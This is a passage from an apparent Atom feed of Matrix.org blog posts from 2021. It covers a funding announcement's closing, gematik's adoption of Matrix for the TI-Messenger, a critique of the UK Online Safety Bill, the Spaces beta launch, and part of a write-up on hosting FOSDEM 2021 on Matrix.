&lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;matrix-doc&#x2F;blob&#x2F;travis&#x2F;msc&#x2F;ipfs&#x2F;proposals&#x2F;2706-IPFS.md&quot;&gt;MSC2706&lt;&#x2F;a&gt;
some attention.  However, there are no plans to use cryptocurrency incentives
in Matrix or Element any time soon.&lt;&#x2F;p&gt;
&lt;p&gt;So, exciting times ahead!  We&#x27;d like to inordinately thank everyone who has
supported Matrix over the years - especially our Patreon supporters, whose
donations pay for all the matrix.org infrastructure while inspiring others to
open their cheque books; the existing investors at Element (especially &lt;a href=&quot;https:&#x2F;&#x2F;notion.vc&quot;&gt;Notion&lt;&#x2F;a&gt;
and &lt;a href=&quot;https:&#x2F;&#x2F;automattic.com&quot;&gt;Automattic&lt;&#x2F;a&gt;, who have come in again on this round); all the large scale
Matrix deployments out there which are effectively turning Matrix into an
industry (hello &lt;a href=&quot;https:&#x2F;&#x2F;matrix.org&#x2F;blog&#x2F;2021&#x2F;07&#x2F;21&#x2F;germanys-national-healthcare-system-adopts-matrix&quot;&gt;gematik!&lt;&#x2F;a&gt;) -
and everyone who has ever run a Matrix server, contributed code, used the
spec to make their own Matrix-powered creation, or simply chatted on Matrix.&lt;&#x2F;p&gt;
&lt;p&gt;Needless to say, Matrix wouldn&#x27;t exist without you: the protocol and network
would have fizzled out long ago were it not for all the people supporting it
(the matrix.org server can now see over 35.5M addressable users on the
network!) - and meanwhile the ever-increasing energy of the community and the
core team combines to keep the protocol advancing forwards faster than ever.&lt;&#x2F;p&gt;
&lt;p&gt;We will do everything we possibly can to succeed in creating the long-awaited
secure communication layer of the open Web, and we look forward to large
amounts of Element&#x27;s new funding being directed directly into core Matrix
development :)&lt;&#x2F;p&gt;
&lt;p&gt;thanks for flying Matrix,&lt;&#x2F;p&gt;
&lt;p&gt;Matthew, Amandine &amp;amp; the whole Matrix core team.&lt;&#x2F;p&gt;
</content>
        
    </entry>
    <entry xml:lang="en">
        <title>Germany’s national healthcare system adopts Matrix!</title>
        <published>2021-07-21T15:30:48+00:00</published>
        <updated>2021-07-21T15:30:48+00:00</updated>
        <author>
          <name>Unknown</name>
        </author>
        <link rel="alternate" href="https://matrix.org/blog/2021/07/21/germany-s-national-healthcare-system-adopts-matrix/" type="text/html"/>
        <id>https://matrix.org/blog/2021/07/21/germany-s-national-healthcare-system-adopts-matrix/</id>
        
        <content type="html">&lt;p&gt;Hi folks,&lt;&#x2F;p&gt;
&lt;p&gt;We’re incredibly excited to officially announce that the national agency for
the digitalisation of the healthcare system in Germany (&lt;a href=&quot;http:&#x2F;&#x2F;gematik.de&quot;&gt;gematik&lt;&#x2F;a&gt;)
has selected Matrix as the open standard on which to base all its
interoperable instant messaging standard - the TI-Messenger.&lt;&#x2F;p&gt;
&lt;p&gt;gematik has released a &lt;a href=&quot;https:&#x2F;&#x2F;fachportal.gematik.de&#x2F;anwendungen&#x2F;ti-messenger&quot;&gt;concept paper&lt;&#x2F;a&gt;
that explains the initiative in full.&lt;&#x2F;p&gt;
&lt;h2 id=&quot;tl-dr&quot;&gt;TL;DR&lt;&#x2F;h2&gt;
&lt;p&gt;With the TI-Messenger, gematik is creating a nationwide decentralised private
communication network - based on Matrix - to support potentially more than
&lt;strong&gt;150,000&lt;&#x2F;strong&gt; healthcare organisations within Germany’s national healthcare system.
It will provide end-to-end encrypted VoIP&#x2F;Video and messaging for the whole
healthcare system, as well as the ability to share healthcare based data,
images and files.&lt;&#x2F;p&gt;
&lt;p&gt;Initially every healthcare provider (HCP) with an HBA (HPC ID card) will be
able to choose their own TI-Messenger provider. The homesever for HCP
accounts will be hosted by the provider’s datacentre. The homeserver for
institutions can be hosted by TI-Messenger providers, or on-premise.&lt;&#x2F;p&gt;
&lt;p&gt;Each organisation and individual will therefore retain complete ownership and
control of their communication data - while being able to share it securely
within the healthcare system with end-to-end encryption by default. All
servers in the Matrix-based private federation will be hosted within
Germany.&lt;&#x2F;p&gt;
&lt;p&gt;Needless to say, security is key when underpinning the entire nation’s
healthcare infrastructure and safeguarding sensitive patient data. As such,
the entire implementation will be &lt;a href=&quot;https:&#x2F;&#x2F;www.bsi.bund.de&#x2F;EN&#x2F;Home&#x2F;home_node.html&quot;&gt;accredited by BSI&lt;&#x2F;a&gt;
(Federal Office for Information Security) and &lt;a href=&quot;https:&#x2F;&#x2F;www.bfdi.bund.de&#x2F;DE&#x2F;Home&#x2F;home_node.html&quot;&gt;BfDI&lt;&#x2F;a&gt;
(Federal Commissioner for Data Protection and Freedom of Information).&lt;&#x2F;p&gt;
&lt;h2 id=&quot;the-full-context&quot;&gt;The full context...&lt;&#x2F;h2&gt;
&lt;p&gt;Germany’s digital care modernisation law (“Digitale Versorgung und Pflege
Modernisierungs Gesetz” or DVPMG), which came into force in June 2021, spells
out  the need for an instant messaging solution.&lt;&#x2F;p&gt;
&lt;p&gt;The urgency has increased by a significant rise in the use of instant
messaging and video conferencing within the healthcare system - for instance,
the amount of medical practices using messenger services doubled in 2020
compared to 2018 (much of this using insecure messaging solutions).&lt;&#x2F;p&gt;
&lt;p&gt;&lt;a href=&quot;https:&#x2F;&#x2F;www.gematik.de&#x2F;&quot;&gt;gematik&lt;&#x2F;a&gt;, majority-owned by Germany’s
&lt;a href=&quot;https:&#x2F;&#x2F;www.bundesgesundheitsministerium.de&#x2F;english-version.html&quot;&gt;Federal Ministry of Health&lt;&#x2F;a&gt;,
is responsible for the standardised digital transformation of Germany’s
healthcare sector. It focuses on improving efficiency and introducing new
ways of working by setting, testing and certifying healthcare technology
including electronic health cards, electronic patient records and
e-prescriptions.&lt;&#x2F;p&gt;
&lt;p&gt;&lt;a href=&quot;https:&#x2F;&#x2F;www.gematik.de&#x2F;anwendungen&#x2F;ti-messenger&#x2F;&quot;&gt;TI-Messenger&lt;&#x2F;a&gt; is gematik’s
technical specification for an interoperable secure instant messaging
standard. The healthcare industry will be able to build a wide range of apps
based on TI-Messenger specifications knowing that, being built on Matrix, all
those apps will interoperate.&lt;&#x2F;p&gt;
&lt;p&gt;More than 150,000 organisations - ranging from local doctors to clinics,
hospitals, and insurance companies - can potentially standardise on instant
messaging thanks to gematik’s TI-Messenger initiative.&lt;&#x2F;p&gt;
&lt;h2 id=&quot;the-road-to-interoperability&quot;&gt;The road to interoperability&lt;&#x2F;h2&gt;
&lt;p&gt;By 1 October 2021, TI-Messenger will initially specify how communication
should work in practice between healthcare professionals (HCPs). Physicians
will be able to find and communicate with each other via TI-Messenger
approved apps - specifications include secure authentication mechanisms with
electronic health professional cards (eHBAs), electronic institution cards
(SMC-B) and a central &lt;a href=&quot;https:&#x2F;&#x2F;hl7.org&#x2F;FHIR&#x2F;&quot;&gt;FHIR&lt;&#x2F;a&gt; directory. The first
compliant apps for HCPs are expected to be licensed by Q2 2022.&lt;&#x2F;p&gt;
&lt;p&gt;Eric Grey (product manager for TI-Messenger at gematik), reckons there will
initially be around 10-15 TI-Messenger compliant Matrix-based apps for HCP
communications available from different vendors. &lt;&#x2F;p&gt;
&lt;p&gt;Healthcare professionals will be able to choose a TI-Messenger provider, who
will be hosting their personal accounts and provide the messenger-client. &lt;&#x2F;p&gt;
&lt;p&gt;Healthcare organisations will choose a TI-Messenger provider to build the
dedicated homeserver infrastructure (on prem or in a data center), provide
the client and ongoing support.&lt;&#x2F;p&gt;
&lt;h2 id=&quot;what-does-this-mean-for-the-matrix-community&quot;&gt;What does this mean for the Matrix community?&lt;&#x2F;h2&gt;
&lt;p&gt;Matrix is already integral to huge parts of the public sector; from the French
government’s Tchap platform, to Bundeswehr’s use of BwMessenger and adoption
by universities and schools across Europe. &lt;&#x2F;p&gt;
&lt;p&gt;Germany’s healthcare system standardising on Matrix takes this to entirely the
next level - and we can’t wait to see the rest of Europe (and the world!)
converge on Matrix for healthcare!&lt;&#x2F;p&gt;
&lt;p&gt;We&#x27;ll have more info about TI-Messenger on this week&#x27;s Matrix Live, out on
Friday - stay tuned!&lt;&#x2F;p&gt;
</content>
        
    </entry>
    <entry xml:lang="en">
        <title>How the UK&#x27;s Online Safety Bill threatens Matrix</title>
        <published>2021-05-19T15:47:03+00:00</published>
        <updated>2021-05-19T14:48:44+00:00</updated>
        <author>
          <name>Unknown</name>
        </author>
        <link rel="alternate" href="https://matrix.org/blog/2021/05/19/how-the-uk-s-online-safety-bill-threatens-matrix/" type="text/html"/>
        <id>https://matrix.org/blog/2021/05/19/how-the-uk-s-online-safety-bill-threatens-matrix/</id>
        
        <content type="html">&lt;p&gt;Last week the UK government published a &lt;a href=&quot;https:&#x2F;&#x2F;www.gov.uk&#x2F;government&#x2F;publications&#x2F;draft-online-safety-bill&quot;&gt;draft of the proposed Online Safety
Bill,&lt;&#x2F;a&gt;
after having initially introduced &lt;a href=&quot;https:&#x2F;&#x2F;www.gov.uk&#x2F;government&#x2F;consultations&#x2F;online-harms-white-paper&#x2F;public-feedback&#x2F;online-harms-white-paper-initial-consultation-response&quot;&gt;formal proposals for said bill in early
2020&lt;&#x2F;a&gt;.
With this post we aim to shed some light on its potential impacts and explain
why we think that this bill - despite having great intentions - may actually
be setting a dangerous precedent when it comes to our rights to privacy,
freedom of expression and self determination.&lt;&#x2F;p&gt;
&lt;p&gt;The proposed bill aims to provide a legal framework to address illegal and
harmful content online. This focus on “not illegal, but harmful” content is at
the centre of our concerns - it puts responsibility on organisations
themselves to arbitrarily decide what might be harmful, without any legal
backing. The bill itself does not actually provide a definition of harmful,
instead relying on service providers to assess and decide on this. This
requirement to identify what is “likely to be harmful” applies to all users,
children and adults. Our question here is - would you trust a service provider
to decide what might be harmful to you and your children, with zero input from
you as a user?&lt;&#x2F;p&gt;
&lt;p&gt;Additionally, the bill incentivises the use of privacy-invasive age
verification processes which come with their own set of problems. This
complete disregard of people’s right to privacy is a reflection of the
privileged perspectives of those in charge of the drafting of this bill, which
fails to acknowledge how &lt;em&gt;actually&lt;&#x2F;em&gt; harmful it would be for certain groups of
the population to have their real life identity associated with their online
identity.&lt;&#x2F;p&gt;
&lt;p&gt;Our view of the world, and of the internet, is largely different from the one
presented by this bill. Now, this categorically does not mean we don’t care
about online safety (it is quite literally our bread and butter) - we just
fundamentally disagree with the approach taken.&lt;&#x2F;p&gt;
&lt;p&gt;Whilst we sympathise with the government’s desire to show action in this space
and to do something about children’s safety (everyone’s safety really), we
cannot possibly agree with the methods.&lt;&#x2F;p&gt;
&lt;p&gt;Back in October of 2020 we presented &lt;a href=&quot;https:&#x2F;&#x2F;matrix.org&#x2F;blog&#x2F;2020&#x2F;10&#x2F;19&#x2F;combating-abuse-in-matrix-without-backdoors&quot;&gt;our proposed approach to online safety&lt;&#x2F;a&gt; -
ironically also in response to a government proposal, albeit about encryption
backdoors. In it, we briefly discussed the dangers of absolute determinations
of morality from a single cultural perspective:&lt;&#x2F;p&gt;
&lt;blockquote&gt;
&lt;p&gt;&lt;a href=&quot;https:&#x2F;&#x2F;matrix.org&#x2F;blog&#x2F;2020&#x2F;10&#x2F;19&#x2F;combating-abuse-in-matrix-without-backdoors&quot;&gt;As uncomfortable as it may be, one man’s terrorist is another man’s freedom fighter, and different jurisdictions have different laws - and it’s not up to the Matrix.org Foundation to play God and adjudicate.&lt;&#x2F;a&gt;&lt;&#x2F;p&gt;
&lt;&#x2F;blockquote&gt;
&lt;p&gt;We now find ourselves reading a piece of legislation that essentially demands
these determinations from tech companies. The beauty of the human experience
lies with its diversity and when we force technology companies to make calls
about what is right or wrong - or what is “likely to have adverse
psychological or physical impacts” on children - we end up in a dangerous
place of centralising and regulating relative morals. Worst of all, when the
consequence of getting it wrong is criminal liability for senior managers what
do we think will happen?&lt;&#x2F;p&gt;
&lt;p&gt;Regardless of how omnipresent it is in our daily lives, technology is still
not a solution for human problems. Forcing organisations to be judge and jury
of human morals for the sake of “free speech” will, ironically, have severe
consequences on free speech, as risk profiles will change for fear of
liability.&lt;&#x2F;p&gt;
&lt;p&gt;Forcing a “duty of care” responsibility on organisations which operate online
will not only drown small and medium sized companies in administrative tasks
and costs, it will further accentuate the existing monopolies by Big Tech.
Plainly, Big Tech can afford the regulatory burden - small start-ups can’t.
Future creators will have their wings clipped from the offset and we might
just miss out on new ideas and projects for fear of legal repercussions. This
is a threat to the technology sector, particularly those building on emerging
technologies like Matrix. In some ways, it is a threat to democracy and some
of the freedoms this bill claims to protect.&lt;&#x2F;p&gt;
&lt;p&gt;These are, quite frankly, steps towards an authoritarian dystopia. If Trust &amp;amp;
Safety managers start censoring something as natural as a nipple on the off
chance it might cause “adverse psychological impacts” on children, whose
freedom of expression are we actually protecting here?&lt;&#x2F;p&gt;
&lt;p&gt;More specifically on the issue of content moderation: the &lt;a href=&quot;https:&#x2F;&#x2F;assets.publishing.service.gov.uk&#x2F;government&#x2F;uploads&#x2F;system&#x2F;uploads&#x2F;attachment_data&#x2F;file&#x2F;985283&#x2F;Draft_Online_Safety_Bill_-_Impact_Assessment_Web_Accessible.pdf&quot;&gt;impact assessment
provided by the government alongside this
bill&lt;&#x2F;a&gt;
predicts that the additional costs for companies directly related to the bill
will be in the billions, over the course of 10 years. The cost for the
government? £400k, in every proposed policy option. Our question is - why are
these responsibilities being placed on tech companies, when evidently this is
a societal problem?&lt;&#x2F;p&gt;
&lt;p&gt;We are not saying it is up to the government to single-handedly end the
existence of Child Sexual Abuse and Exploitation (CSAE) or extremist content
online. What we are saying is that it takes more than content filtering, risk
assessments and (faulty) age verification processes for it to end. More
funding for tech literacy organisations and schools, to give children (and
parents) the tools to stay safe is the first thing that comes to mind. Further
investment in law enforcement cyber units and the judicial system, improving
tech companies’ routes for abuse reporting and allowing the actual judges to
do the judging seems pretty sensible too. What is absolutely egregious is the
degradation of the digital rights of the majority, due to the wrongdoings of a
few.&lt;&#x2F;p&gt;
&lt;p&gt;Our goal with this post is not to be dramatic or alarmist. However, we want to
add our voices to the countless &lt;a href=&quot;https:&#x2F;&#x2F;www.openrightsgroup.org&#x2F;blog&#x2F;online-abuse-why-management-liability-isnt-the-answer&#x2F;&quot;&gt;digital rights
campaigners&lt;&#x2F;a&gt;,
individuals and organisations that have been raising the alarm since the early
days of this bill. Just like with coercive control and abuse, the degradation
of our rights does not happen all at once. It is a slippery slope that starts
with something as (seemingly) innocuous as &lt;a href=&quot;https:&#x2F;&#x2F;twitter.com&#x2F;matthew_d_green&#x2F;status&#x2F;1392823038920564736&quot;&gt;mandatory content scanning for
CSAE content and ends with authoritarian surveillance
infrastructure&lt;&#x2F;a&gt;.
It is our duty to put a stop to this before it even begins.&lt;&#x2F;p&gt;
&lt;small style=&quot;display: block; text-align: right&quot;&gt;
Twitter card image credit from &lt;a href=&quot;https:&#x2F;&#x2F;film-grab.com&#x2F;2010&#x2F;10&#x2F;04&#x2F;brazil&#x2F;#bwg644&#x2F;39614&quot;&gt;Brazil&lt;&#x2F;a&gt;, which feels all too familiar right now.
&lt;&#x2F;small&gt;
</content>
        
    </entry>
    <entry xml:lang="en">
        <title>The Matrix Space Beta!</title>
        <published>2021-05-17T17:50:17+00:00</published>
        <updated>2021-05-17T17:35:09+00:00</updated>
        <author>
          <name>Unknown</name>
        </author>
        <link rel="alternate" href="https://matrix.org/blog/2021/05/17/the-matrix-space-beta/" type="text/html"/>
        <id>https://matrix.org/blog/2021/05/17/the-matrix-space-beta/</id>
        
        <content type="html">&lt;p&gt;Hi all,&lt;&#x2F;p&gt;
&lt;p&gt;As many know, over the years we&#x27;ve experimented with how to let users locate
and curate sets of users and rooms in Matrix. &lt;a href=&quot;https:&#x2F;&#x2F;medium.com&#x2F;@RiotChat&#x2F;communities-aka-groups-are-here-announcing-riot-web-0-13-riot-ios-0-6-and-riot-android-0-7-4-933cb193a28e&quot;&gt;Back in Nov
2017&lt;&#x2F;a&gt;
we added &#x27;groups&#x27; (aka &#x27;communities&#x27;) as a custom mechanism for this -
introducing identifiers beginning with a + symbol to represent sets of rooms
and users, like &lt;a href=&quot;https:&#x2F;&#x2F;matrix.to&#x2F;#&#x2F;+matrix:matrix.org&quot;&gt;+matrix:matrix.org&lt;&#x2F;a&gt;.&lt;&#x2F;p&gt;
&lt;p&gt;However, it rapidly became obvious that Communities had some major
shortcomings.  They ended up being an extensive and entirely new API surface
(designed around letting you dynamically bridge the membership of a group
through to a single source of truth like LDAP) - while in practice groups
have enormous overlap with rooms: managing membership, inviting by email,
access control, power levels, names, topics, avatars, etc.  Meanwhile the
custom groups API re-invented the wheel for things like pushing updates
to the client (causing a whole suite of
&lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;vector-im&#x2F;element-web&#x2F;issues&#x2F;5235&quot;&gt;problems&lt;&#x2F;a&gt;).  So clients
and servers alike ended up reimplementing large chunks of similar
functionality for both rooms and groups.&lt;&#x2F;p&gt;
&lt;p&gt;And so almost before Communities were born, we started thinking about whether
it would make more sense to model them as a special type of room, rather than
being their own custom primitive.
&lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;matrix-doc&#x2F;issues&#x2F;1215&quot;&gt;MSC1215&lt;&#x2F;a&gt; had the first
thoughts on this in 2017, and then a formal proposal emerged at
&lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;matrix-doc&#x2F;pull&#x2F;1772&quot;&gt;MSC1772&lt;&#x2F;a&gt; in Jan 2019. We
started working on this in earnest at the end of 2020, and christened the new
way of handling groups of rooms and users as... Spaces!&lt;&#x2F;p&gt;
&lt;p&gt;Spaces work as follows:&lt;&#x2F;p&gt;
&lt;ul&gt;
&lt;li&gt;You can designate specific rooms as &#x27;spaces&#x27;, which contain other rooms.&lt;&#x2F;li&gt;
&lt;li&gt;You can have a nested hierarchy of spaces.&lt;&#x2F;li&gt;
&lt;li&gt;You can rapidly navigate around that hierarchy using the new &#x27;space summary&#x27;
(aka space-nav) API - &lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;matrix-doc&#x2F;blob&#x2F;kegan&#x2F;spaces-summary&#x2F;proposals&#x2F;2946-spaces-summary.md&quot;&gt;MSC2946&lt;&#x2F;a&gt;.&lt;&#x2F;li&gt;
&lt;li&gt;Spaces can be shared with other people publicly, or invite-only, or private
for your own curation purposes.&lt;&#x2F;li&gt;
&lt;li&gt;Rooms can appear in multiple places in the hierarchy.&lt;&#x2F;li&gt;
&lt;li&gt;You can have &#x27;secret&#x27; spaces where you group your own personal rooms and
spaces into an existing hierarchy.&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;p&gt;Today, we&#x27;re ridiculously excited to be launching Space support as a beta in
matrix-react-sdk and matrix-android-sdk2 (and thus Element Web&#x2F;Desktop and
Element Android) and Synapse
&lt;a href=&quot;https:&#x2F;&#x2F;matrix.org&#x2F;blog&#x2F;2021&#x2F;05&#x2F;17&#x2F;synapse-1-34-0-released&quot;&gt;1.34.0&lt;&#x2F;a&gt; - so head
over to your nearest Element, make sure it&#x27;s connected to the latest Synapse
(and that Synapse has Spaces enabled in its config) and find some Space to
explore! &lt;a href=&quot;https:&#x2F;&#x2F;matrix.to&#x2F;#&#x2F;#community:matrix.org&quot;&gt;#community:matrix.org&lt;&#x2F;a&gt;
might be a good start :)&lt;&#x2F;p&gt;
&lt;p&gt;The beta today gives us the bare essentials: and we haven&#x27;t yet finished
space-based access controls such as setting powerlevels in rooms based on
space membership
(&lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;matrix-doc&#x2F;blob&#x2F;matthew&#x2F;msc2962&#x2F;proposals&#x2F;2962-spaces-access-control.md&quot;&gt;MSC2962&lt;&#x2F;a&gt;)
or limiting who can join a room based on their space membership
(&lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;matrix-doc&#x2F;blob&#x2F;clokep&#x2F;restricted-rooms&#x2F;proposals&#x2F;3083-restricted-rooms.md&quot;&gt;MSC3083&lt;&#x2F;a&gt;) -
but these will be coming asap.  We also need to figure out how to implement
Flair on top of Spaces rather than Communities.&lt;&#x2F;p&gt;
&lt;p&gt;This is also a bit of a turning point in Matrix&#x27;s architecture: we are now
using rooms more and more as a generic way of modelling new features in
Matrix.  For instance, rooms could be used as a structured way of storing
files (&lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;matrix-doc&#x2F;pull&#x2F;3089&quot;&gt;MSC3089&lt;&#x2F;a&gt;);
Reputation data
(&lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;matrix-doc&#x2F;pull&#x2F;2313&quot;&gt;MSC2313&lt;&#x2F;a&gt;) is stored in
rooms; Threads can be stored in rooms
(&lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;matrix-doc&#x2F;pull&#x2F;2836&quot;&gt;MSC2836&lt;&#x2F;a&gt;); Extensible
Profiles are proposed as rooms too
(&lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;matrix-doc&#x2F;pull&#x2F;1769&quot;&gt;MSC1769&lt;&#x2F;a&gt;).  As such,
this pushes us towards ensuring rooms are as lightweight as possible in Matrix -
and that things like sync and changing profile scale independently of the
number of rooms you&#x27;re in.  Spaces effectively gives us a way of creating a
global decentralised filesystem hierarchy on top of Matrix - grouping the
existing rooms of all flavours into an epic multiplayer tree of realtime data.
It&#x27;s like USENET had a baby with the Web!&lt;&#x2F;p&gt;
&lt;p&gt;For lots more info from the Element perspective, head over to the &lt;a href=&quot;https:&#x2F;&#x2F;element.io&#x2F;blog&#x2F;p&#x2F;4ff44807-fe9a-4363-8521-9eab7efd4365&#x2F;&quot;&gt;Element
blog&lt;&#x2F;a&gt;. 
Finally, the point of the beta is to gather feedback and fix bugs - so please
go wild in Element reporting your first impressions and help us make Spaces as
awesome as they deserve to be!&lt;&#x2F;p&gt;
&lt;p&gt;Thanks for flying Matrix into Space;&lt;&#x2F;p&gt;
&lt;p&gt;Matthew &amp;amp; the whole Spaces (and Matrix) team.&lt;&#x2F;p&gt;
</content>
        
    </entry>
    <entry xml:lang="en">
        <title>How we hosted FOSDEM 2021 on Matrix</title>
        <published>2021-02-15T00:00:00+00:00</published>
        <updated>2021-02-15T00:00:00+00:00</updated>
        <author>
          <name>Unknown</name>
        </author>
        <link rel="alternate" href="https://matrix.org/blog/2021/02/15/how-we-hosted-fosdem-2021-on-matrix/" type="text/html"/>
        <id>https://matrix.org/blog/2021/02/15/how-we-hosted-fosdem-2021-on-matrix/</id>
        
        <content type="html">&lt;p&gt;Hi all,&lt;&#x2F;p&gt;
&lt;p&gt;Just over a week ago we had the honour of using Matrix to host FOSDEM: the world&#x27;s largest free &amp;amp; open source software conference.  It&#x27;s taken us a little while to write up the experience given we had to recover and catch up on business as usual... but better late than never, here&#x27;s an overview of what it takes to run a ~30K attendee conference on Matrix!&lt;&#x2F;p&gt;
&lt;p&gt;&lt;img src=&quot;&#x2F;blog&#x2F;img&#x2F;upload_5335e89b9ca474d844bdc37ea328967b.png&quot; alt=&quot;&quot; &#x2F;&gt;&lt;small&gt;&lt;center&gt;&lt;em&gt;[confetti and firework easter-eggs explode over the closing keynote of FOSDEM 2021]&lt;&#x2F;em&gt;&lt;&#x2F;center&gt;&lt;&#x2F;small&gt;&lt;&#x2F;p&gt;
&lt;p&gt;First of all, a quick (re)introduction to Matrix for any newcomers: Matrix is an open source project which defines an open standard protocol for decentralised communication.  The global Matrix network makes up at least 28M Matrix IDs spread over around 60K servers.  For FOSDEM, we set up a fosdem.org server to host newcomers, provided by &lt;a href=&quot;https:&#x2F;&#x2F;ems.element.io&quot;&gt;Element Matrix Services (EMS)&lt;&#x2F;a&gt; - &lt;a href=&quot;https:&#x2F;&#x2F;element.io&quot;&gt;Element&lt;&#x2F;a&gt; being the startup formed by the Matrix core team to help fund Matrix development.&lt;&#x2F;p&gt;
&lt;p&gt;The most unique thing about Matrix is that conversations get replicated across all servers whose users are present in the conversation, so there&#x27;s never a single point of control or failure for a conversation (much as git repositories get replicated between all contributors).  And so hosting FOSDEM in Matrix meant that everyone already on Matrix (including users bridged to Matrix from IRC, XMPP, Slack, Discord etc) could attend directly - in addition to users signing up for the first time on the FOSDEM server.  Therefore the chat around FOSDEM 2021 now exists for posterity on all the Matrix servers whose users who participated; and we hope that the fosdem.org server will hang around for the benefit of all the newcomers for the foreseeable so they don&#x27;t lose their accounts!&lt;&#x2F;p&gt;
&lt;p&gt;Talking of which: the vital stats of the weekend were as follows:&lt;&#x2F;p&gt;
&lt;ul&gt;
&lt;li&gt;We saw almost 30K local users on the FOSDEM server + 4K remote users from elsewhere in Matrix.&lt;&#x2F;li&gt;
&lt;li&gt;There were 24,826 guests (read-only invisible users) on the FOSDEM server.&lt;&#x2F;li&gt;
&lt;li&gt;There were 8,060 distinct users actively joined to the public FOSDEM rooms...&lt;&#x2F;li&gt;
&lt;li&gt;...of which 3,827 registered on the FOSDEM server.  (This is a bit of an eye-opener: over 50% of the actively participating attendees for FOSDEM were already on Matrix!)&lt;&#x2F;li&gt;
&lt;li&gt;These numbers don&#x27;t count users who were viewing the livestreams directly, but only those who were attending via Matrix.&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;p&gt;Given last year&#x27;s FOSDEM had roughly 8,500 in-person attendees at the Université libre de Bruxelles, this feels like a pretty good outcome :)&lt;&#x2F;p&gt;
&lt;p&gt;Graphwise, local user activity on the FOSDEM server looked like this:&lt;&#x2F;p&gt;
&lt;p&gt;&lt;img src=&quot;&#x2F;blog&#x2F;img&#x2F;upload_e24e0febde0118ea9f2e93005d926d48.png&quot; alt=&quot;&quot; &#x2F;&gt;
&lt;img src=&quot;&#x2F;blog&#x2F;img&#x2F;upload_63bad29ebc4d672d9979f9eea48fcfc5.png&quot; alt=&quot;&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
&lt;h2 id=&quot;how-was-it-built&quot;&gt;How was it built?&lt;&#x2F;h2&gt;
&lt;p&gt;There were four main components on the Matrix side:&lt;&#x2F;p&gt;
&lt;ol&gt;
&lt;li&gt;A horizontally-scalable Matrix server deployment (Synapse hosted in &lt;a href=&quot;https:&#x2F;&#x2F;ems.element.io&quot;&gt;EMS&lt;&#x2F;a&gt;)&lt;&#x2F;li&gt;
&lt;li&gt;A Jitsi cluster for the video conferencing, used to host all the Q&amp;amp;A sessions, hallway sessions, stands, and other adhoc video conferences&lt;&#x2F;li&gt;
&lt;li&gt;An elastically scalable Jibri cluster used to livestream the Jitsi conferences both to the official FOSDEM livestreams and to provide a local preview of the conference on Matrix (to avoid the Jitsis getting overloaded with folks who just want to view)&lt;&#x2F;li&gt;
&lt;li&gt;&lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;conference-bot&quot;&gt;conference-bot&lt;&#x2F;a&gt; - a Matrix bot which orchestrated the overall conference on Matrix, written from scratch for FOSDEM by &lt;a href=&quot;https:&#x2F;&#x2F;matrix.to&#x2F;#&#x2F;@travis:t2l.io&quot;&gt;TravisR&lt;&#x2F;a&gt;, consuming the schedule from FOSDEM and maintaining all the necessary rooms with the correct permissions, widgets, invites, etc.&lt;&#x2F;li&gt;
&lt;&#x2F;ol&gt;
&lt;p&gt;Architecturally, it looked like this:&lt;&#x2F;p&gt;
&lt;p&gt;&lt;img src=&quot;&#x2F;blog&#x2F;img&#x2F;upload_06b59bc2b2d518ffe616020e1fe5bee8.png&quot; alt=&quot;&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
&lt;p&gt;On the clientside, we made heavy use of widgets: the ability to embed arbitrary web content as iframes into Matrix chatrooms. (Widgets currently exist as a set of &lt;a href=&quot;https:&#x2F;&#x2F;matrix.org&#x2F;docs&#x2F;spec&#x2F;proposals&quot;&gt;proposals&lt;&#x2F;a&gt; for the Matrix spec, which have been preemptively implemented in Element.)&lt;&#x2F;p&gt;
&lt;p&gt;For instance, the conference-bot created Matrix rooms for all the FOSDEM devrooms with a predefined widget for viewing the official FOSDEM livestream for that room, pointing at the appropriate HLS stream at stream.fosdem.org - which looked like this:&lt;&#x2F;p&gt;
&lt;p&gt;&lt;img src=&quot;&#x2F;blog&#x2F;img&#x2F;upload_07145dc9cf8d5ae22b6eaf91a63dd8d6.jpg&quot; alt=&quot;&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
&lt;p&gt;Each devroom also had a schedule widget available on the righthand side, visualising the schedule of that room - huge thanks to Hato and Steffen and folks at &lt;a href=&quot;https:&#x2F;&#x2F;nordeck.net&#x2F;&quot;&gt;Nordeck&lt;&#x2F;a&gt; for putting this together at the last minute; it enormously helped navigate the devrooms (and even had a live countdown to help you track where you were at in the schedule!)&lt;&#x2F;p&gt;
&lt;p&gt;Each devroom was also available via IRC on Freenode via a dedicated bridge (#fosdem-...) and via XMPP.&lt;&#x2F;p&gt;
&lt;p&gt;The bot also created rooms for each and every talk at FOSDEM (all 666 of them), as the space where the speaker and host could hang out in advance; watch the talk together, and then broadcast the Q&amp;amp;A session.  At the end of the talk slot, the bot then transformed the talk room into a &#x27;hallway&#x27; for the talk, and advertised it to the audience in the devroom, so folks could pose follow-on questions to the speaker as so often happens in real life at FOSDEM.  The speaker&#x27;s view of the talk rooms looked like this:&lt;&#x2F;p&gt;
&lt;p&gt;&lt;img src=&quot;&#x2F;blog&#x2F;img&#x2F;upload_f8b9121b21323955233d6633d19e3fb5.jpg&quot; alt=&quot;&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
